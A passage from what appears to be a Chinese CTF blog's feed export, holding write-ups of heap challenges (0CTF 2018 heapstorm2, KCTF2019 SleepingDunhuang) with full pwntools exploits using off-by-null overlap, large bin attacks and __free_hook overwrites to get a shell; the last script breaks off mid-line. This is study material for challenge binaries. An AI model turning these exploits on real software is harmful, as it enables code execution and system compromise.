class="string">'a'</span>*<span class="number">0x67</span>)<span class="comment">#2</span></span><br><span class="line">    New(<span class="string">'a'</span>*<span class="number">0x67</span>)<span class="comment">#3</span></span><br><span class="line">    New(<span class="string">'b'</span>*<span class="number">0x67</span>)<span class="comment">#4</span></span><br><span class="line">    New(<span class="string">'c'</span>*<span class="number">0x20</span>)<span class="comment">#5</span></span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = p64(fake_chunk)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x67</span>,<span class="string">'a'</span>)</span><br><span class="line">    New(payload)<span class="comment">#init chunk3</span></span><br><span class="line">    New(<span class="string">'d'</span>*<span class="number">0x67</span>)<span class="comment">#init chunk4</span></span><br><span class="line">    New(<span class="string">'e'</span>*<span class="number">0x67</span>)<span class="comment">#init chunk2</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x13</span> + p64(shell_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x67</span>,<span class="string">'a'</span>)</span><br><span class="line">    New(payload)<span class="comment">#overwrite</span></span><br><span class="line">    <span class="comment">#trigger</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2019信息安全竞赛</category>
      </categories>
  </entry>
  <entry>
    <title>2018 0ctf heapstorm2</title>
    <url>/2020/09/03/2018_0ctf/heapstorm2/</url>
    <content><![CDATA[<h1 id="heapstorm2"><a href="#heapstorm2" class="headerlink" title="heapstorm2"></a>heapstorm2</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天做RCT的题做不来看wp提到用到了这道题的方法，于是做一下这道2018年0ctf的题，照着sakura师傅的wp复现了一下</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序一共有4个功能，Alloc，Update，Delete和View。</p>
<p><img src="/2020/09/03/2018_0ctf/heapstorm2/1.jpg" alt="main"></p>
<p>init函数用了mallopt将M_MXFAST置为0，这个变量表示一个阈值，此阈值以下的size分配chunk的时候使用fastbin，否则不用。这里置为0，表示所有的chunk都不走fast bin,无论是分配或是释放。此外程序使用mmap分配了一块内存区域0x13370000，可读可写。map_addr[0]、map_addr[1]、map_addr[2]为/dev/urandom生成的随机数。map_addr[3]=map_addr[2]</p>
<p><img src="/2020/09/03/2018_0ctf/heapstorm2/2.jpg" alt="init"></p>
<p>Alloc()函数从map_addr[4]开始寻找空闲位置(xor寻找)，size要求大于12小于0x1001，使用calloc，因此会将内存清零。map_addr[i]存放的是size和map_addr[0]异或的值，map_addr[i+1]存放的是chunk_addr和map_addr[1]异或的值。</p>
<p><img src="/2020/09/03/2018_0ctf/heapstorm2/3.jpg" alt="Alloc"></p>
<p>Update函数往chunk里写值，这里有一个off-one-null漏洞</p>
<p><img src="/2020/09/03/2018_0ctf/heapstorm2/4.jpg" alt="update"></p>
<p>Delete函数释放堆块并将原位置置为map_addr[0]和map_addr[1]</p>
<p><img src="/2020/09/03/2018_0ctf/heapstorm2/5.jpg" alt="Delete"></p>
<p>View函数要先满足map_addr[2] xor map_addr[3] == 0x13377331，否则不能输出</p>
<p><img src="/2020/09/03/2018_0ctf/heapstorm2/6.jpg" alt="View"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序中有一个off-one-null漏洞，可以用来chunk extend 或者chunk shrink来构造overlap chunk。</p>
<p>构造下面的chunk：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Alloc(<span class="number">0x18</span>)<span class="comment">#0  </span></span><br><span class="line">Alloc(<span class="number">0x508</span>)<span class="comment">#1  </span></span><br><span class="line">Alloc(<span class="number">0x18</span>)<span class="comment">#2  </span></span><br><span class="line">Update(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))  </span><br><span class="line"></span><br><span class="line">Alloc(<span class="number">0x18</span>)<span class="comment">#3  </span></span><br><span class="line">Alloc(<span class="number">0x508</span>)<span class="comment">#4  </span></span><br><span class="line">Alloc(<span class="number">0x18</span>)<span class="comment">#5  </span></span><br><span class="line">Update(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))  </span><br><span class="line">Alloc(<span class="number">0x18</span>)<span class="comment">#6</span></span><br></pre></td></tr></table></figure></p>
<p>Delete(1)使得chunk1进入unsorted bin，此时chunk2的prev_size为0x510，size为0x20。Update(0)可以通过one-byte-null修改chunk1的size从0x511到0x500<br>Alloc(0x18)从unsorted bin中分割出来大小为0x20的chunk1，Alloc(0x4d8)从unsorted bin中分割出来大小为0x4e0的chunk7(因为这个chunk没有跟chunk2相邻，所以chunk2的prev_in_use还是0)，由于其size改为0x500，unsorted bin用完。Delete(1)使得chunk7的prev_size为0x20,size为0x4e0。此时Delete(2)，chunk2的prev_size为0x510，找到chunk1,chunk1的next chunk即chunk7的prev_in_use为0，chunk7寻址到chunk7+0x4e0处，即0x500,fake_precv_size，也被认为是空闲chunk，于是一个unlink合并了chunk1、chunk7、chunk2。</p>
<p>这个技巧是首先在unsorted bin的后面伪造好fake_prev_size同时利用off-one-null设置好unsorted bin下一个chunk的fake_size(prev_in_use)为0。通过off-one-null修改unsorted bin的size，分配两个chunk,Free第一个和之前的chunk2，合并三个chunk，再分配Alloc(0x38)+Alloc(0x4e8)即可造成Overlap chunk。</p>
<p>overlap chunk:<br>chunk7:0x040<br>chunk2:0x060  </p>
<p>同样的套路,到Alloc(0x48)，造成overlap。</p>
<p>chunk8:0x590<br>free_chunk:0x5c0 </p>
<p>这时候0x5c0在unsorted bin。Delete(2)使得0x060进入unsorted bin。Alloc(0x4e8)，0x5c0进入large bin而0x060被分配。再Delete(2)使得0x060进去unsorted bin </p>
<p><img src="/2020/09/03/2018_0ctf/heapstorm2/7.jpg" alt="bins"></p>
<p><img src="/2020/09/03/2018_0ctf/heapstorm2/8.jpg" alt="bins2"></p>
<p>下面通过overlap修改chunk2的bk<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#use chunk7 to overwrite chunk2</span></span><br><span class="line">    storage = <span class="number">0x13370000</span> + <span class="number">0x800</span></span><br><span class="line">    fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line">    p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>)</span><br><span class="line">    p1 += p64(<span class="number">0</span>) + p64(fake_chunk)</span><br><span class="line">    Update(<span class="number">7</span>,p1)</span><br></pre></td></tr></table></figure></p>
<p>再通过overlap修改large bin的bk和bk_nextsize<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#use chunk8 to overwrite large bin</span></span><br><span class="line">   p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>)<span class="comment">#size</span></span><br><span class="line">   p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)</span><br><span class="line">   p2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)</span><br><span class="line">   Update(<span class="number">8</span>,p2)</span><br></pre></td></tr></table></figure></p>
<p>此时再分配一个chunk，会先去检查unsorted bin，如果没有合适的就把其中的chunk插入到large bin中，源码如下：（这里直接搬运sakura师傅的博客）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = largebin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">             ....</span><br><span class="line">             ....</span><br><span class="line">             ....</span><br><span class="line">             <span class="comment">// 如果size&lt;large bin中最后一个chunk即最小的chunk，就直接插到最后</span></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">                     &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;</span><br><span class="line">                     bck = bck-&gt;bk;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">               <span class="comment">// 否则正向遍历，fwd起初是large bin第一个chunk，也就是最大的chunk。</span></span><br><span class="line">             <span class="comment">// 直到满足size&gt;=large bin chunk size</span></span><br><span class="line">                     <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                       &#123;</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;<span class="comment">//fd_nextsize指向比当前chunk小的下一个chunk</span></span><br><span class="line">                         assert (chunk_main_arena (fwd));</span><br><span class="line">                       &#125;</span><br><span class="line">                     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">                         == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;</span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                 <span class="comment">// 插入</span></span><br><span class="line">                       &#123;</span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                       &#125;</span><br><span class="line">                     bck = fwd-&gt;bk;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">           &#125;</span><br><span class="line">         mark_bin (av, victim_index);</span><br><span class="line">         victim-&gt;bk = bck;</span><br><span class="line">         victim-&gt;fd = fwd;</span><br><span class="line">         fwd-&gt;bk = victim;</span><br><span class="line">         bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>这里的fwd是0x5c0，victim是0x060。victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;使得<em>(fake_chunk-0x18-5+0x20)=</em>(storage-0x18-5)=0x060。<br>fwd-&gt;bk=victim;使得*(storage-0x20+8)=0x060</p>
<p>当这个chunk处理完了之后继续寻找unsorted bin的下一个chunk，这里我们设置的是fake_chunk，如果不满足分配就插入到large bin中。fake_chunk的size为0x13370800-0x20+0x8=0x133707e8，我们之前通过覆写使得<em>(0x13370800-0x20-0x18-5+0x20)=</em>0x133707e3=victim，gdb看一下可以看到e8为\x56或\x55。要求是\x56，来满足一个条件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x133707e3</span><br><span class="line">0x133707e3:	0x000056213c4c8060</span><br></pre></td></tr></table></figure></p>
<p>chunk的mmap标志位置为0。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">         av == arena_for_chunk (mem2chunk (mem)));</span><br></pre></td></tr></table></figure></p>
<p>之后alloc(0x48)多试几次就可以得到fake_chunk。</p>
<h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>分配到fake_chunk之后首先把map_addr的前三个成员置为0，第四个置为0x13377331以绕过View的检查。之后将第一个chunk填为storage以通过update重新编辑storage。第二个chunk设为storage-0x20+3，可以泄露出heap_base，同样套路这时候看看heap里哪里有涉及到Libc的，重新设置chunk2为这个地址，泄露出libc</p>
<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>同样套路将第二个chunk地址设置为free_hook地址，update填入one_gadget地址</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><p>exp基本是sakura师傅的</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">'./heapstorm2'</span>)</span><br><span class="line"><span class="comment">#p = process(["./heapstorm2"],env=&#123;"LD_PRELOAD":'./libc-2.24.so'&#125;)</span></span><br><span class="line">elf = ELF(<span class="string">'./heapstorm2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">View</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#chunk shrink</span></span><br><span class="line">    Alloc(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(<span class="number">0x508</span>)<span class="comment">#1</span></span><br><span class="line">    Alloc(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">    Update(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">    Alloc(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">    Alloc(<span class="number">0x508</span>)<span class="comment">#4</span></span><br><span class="line">    Alloc(<span class="number">0x18</span>)<span class="comment">#5</span></span><br><span class="line">    Update(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">    Alloc(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line">    log.success(<span class="string">'chunks design ok!'</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Update(<span class="number">0</span>,(<span class="number">0x18</span><span class="number">-12</span>)*<span class="string">'a'</span>)</span><br><span class="line">    log.success(<span class="string">'overwrite chunk1 size'</span>)</span><br><span class="line">    Alloc(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">    Alloc(<span class="number">0x4d8</span>)<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)<span class="comment">#unlink</span></span><br><span class="line"></span><br><span class="line">    Alloc(<span class="number">0x38</span>)<span class="comment">#1---&gt;7 overlap</span></span><br><span class="line">    Alloc(<span class="number">0x4e8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#same method to get another one</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Update(<span class="number">3</span>,<span class="string">'a'</span>*(<span class="number">0x18</span><span class="number">-12</span>))</span><br><span class="line"></span><br><span class="line">    Alloc(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">    Alloc(<span class="number">0x4d8</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">5</span>)<span class="comment">#unlink</span></span><br><span class="line"></span><br><span class="line">    Alloc(<span class="number">0x48</span>)<span class="comment">#4--&gt;8 overlap</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#large bin attack</span></span><br><span class="line">    <span class="comment">#insert unosorted bin to large bin list</span></span><br><span class="line">    Delete(<span class="number">2</span>)<span class="comment">#make chunk 0x5c0 into large bin</span></span><br><span class="line">    Alloc(<span class="number">0x4e8</span>)<span class="comment">#2</span></span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#use chunk7 to overwrite chunk2</span></span><br><span class="line">    storage = <span class="number">0x13370000</span> + <span class="number">0x800</span></span><br><span class="line">    fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line">    p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>)</span><br><span class="line">    p1 += p64(<span class="number">0</span>) + p64(fake_chunk)</span><br><span class="line">    Update(<span class="number">7</span>,p1)</span><br><span class="line">    <span class="comment">#use chunk8 to overwrite large bin</span></span><br><span class="line">    p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>)<span class="comment">#size</span></span><br><span class="line">    p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)</span><br><span class="line">    p2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)</span><br><span class="line">    Update(<span class="number">8</span>,p2)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Alloc(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">    <span class="comment">#malloc to 0x133707e0</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    Update(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x13377331</span>)+p64(storage))</span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x13377331</span>)+p64(storage) + p64(<span class="number">0x1000</span>) + p64(storage<span class="number">-0x20</span>+<span class="number">3</span>)+p64(<span class="number">8</span>)</span><br><span class="line">    Update(<span class="number">0</span>,payload)</span><br><span class="line">    View(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Chunk[1]: '</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>)) - <span class="number">0x60</span></span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x13377331</span>)+p64(storage) + p64(<span class="number">0x1000</span>) + p64(heap_base+<span class="number">0x60</span>+<span class="number">0x10</span>) + p64(<span class="number">8</span>)</span><br><span class="line">    Update(<span class="number">0</span>,payload)</span><br><span class="line">    View(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Chunk[1]: '</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>)) - <span class="number">88</span> - <span class="number">0x3c4b20</span></span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x13377331</span>)+p64(storage) + p64(<span class="number">0x1000</span>) + p64(free_hook) + p64(<span class="number">8</span>)</span><br><span class="line">    Update(<span class="number">0</span>,payload)</span><br><span class="line">    Update(<span class="number">1</span>,p64(shell_addr))</span><br><span class="line">    <span class="comment">#Alloc(0x40)</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/03/2018_0ctf/heapstorm2/9.jpg" alt="flag"></p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://eternalsakura13.com/2018/04/03/heapstorm2/" target="_blank" rel="noopener">sakura</a></p>
]]></content>
      <categories>
        <category>0CTF2018</category>
      </categories>
  </entry>
  <entry>
    <title>沉睡的敦煌</title>
    <url>/2020/09/03/2019_kctf/SleepingDunhuang/</url>
    <content><![CDATA[<h1 id="KCTF2019-SleepingDunhuang"><a href="#KCTF2019-SleepingDunhuang" class="headerlink" title="KCTF2019 SleepingDunhuang"></a>KCTF2019 SleepingDunhuang</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这题太坑了，最开始edit的次数限制是2，做出来之后远程一直不通，问了客服才知道临时换题了，目次2次有多解，事实证明2次的确多解了，嗨呀早点做就好了。</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序有4个功能，但是使用起来有诸多限制。</p>
<p><img src="/2020/09/03/2019_kctf/SleepingDunhuang/1.jpg" alt="main"></p>
<p><img src="/2020/09/03/2019_kctf/SleepingDunhuang/2.jpg" alt="menu"></p>
<p>Malloc的地址限制在bss某个地址上的值[0,800]范围内，这里初始化成heap_base，有个gift可以泄露堆地址。啊对每次Malloc(0x28)但是读0x29，可以off-by-one，修改下一个chunk的prev_size和size的低字节。</p>
<p><img src="/2020/09/03/2019_kctf/SleepingDunhuang/3.jpg" alt="malloc"></p>
<p>Free应该没什么毛病</p>
<p><img src="/2020/09/03/2019_kctf/SleepingDunhuang/4.jpg" alt="free"></p>
<p>Edit只能有一次机会。</p>
<p><img src="/2020/09/03/2019_kctf/SleepingDunhuang/5.jpg" alt="edit"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>看了下出题人的发帖，似乎之前普及过unlink的出题思路2333，首先要泄露出来libc，构造unsorted bin。使用off-by-one申请chunk[i]，然后修改chunk[i+1]的size为0x90并释放chunk[i+1]，最终free7个0x90的块，此后0x90再释放就会进unsorted bin。</p>
<p>之后最开始我构造overlap chunk然后double free到一个释放的unsorted bin上修改其prev_size和size，实际上不用这么麻烦(且之后会出问题)，可以先free一个中间块，再malloc它，在其中构造fake_chunk(大小为0x20)+0x20+’\x90’从而使其下一个chunk的prev_size为0x20，size为0x90，之前我们提到再释放0x90的块就会使其进入unsorted bin，现在释放这个chunk即可unlink。之后再add两次就可以得到重合堆块了，从而double free。</p>
<p>具体地，我们先对0x404178位置的块进行unlink，铺垫一下。</p>
<p>之后用double free分配到第一个堆块(这个堆地址存储在0x404060中)，对这个块再用相同的方法unlink，从而使得0x404060的值为0x404048，进而Malloc的限制变成了0x404048-0x404048+0x800，我们用Edit编辑0x404060-0x404088，伪造一个假堆块0x404060，0x404078填0x404070即可free0x404060这个块到tcache里，再malloc就可以绕过检查，编辑0x404070开始的0x28区域，去掉所有的限制，之后free_hook改成system，Free一个”/bin/sh\x00”的块即可执行system(“/bin/sh\x00”)</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    libc_offset = <span class="number">0x3ebc40</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'152.136.18.34'</span>,<span class="number">10001</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    libc_offset = <span class="number">0x3ebc40</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'4.show\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'gift: '</span>)</span><br><span class="line">    gift = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">'gift value =&gt; '</span> + hex(gift))</span><br><span class="line">    p.recvuntil(<span class="string">'content:\n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    <span class="keyword">return</span> gift</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Malloc1</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'4.show\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'content:\n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    p.recvuntil('content:\n')</span></span><br><span class="line"><span class="string">    p.send(content)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'4.show\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'4.show\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'content:\n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'4.show\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">##0~13</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">14</span>,<span class="number">2</span>):</span><br><span class="line">        add(i,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">        add(i+<span class="number">1</span>,<span class="string">'a'</span>*<span 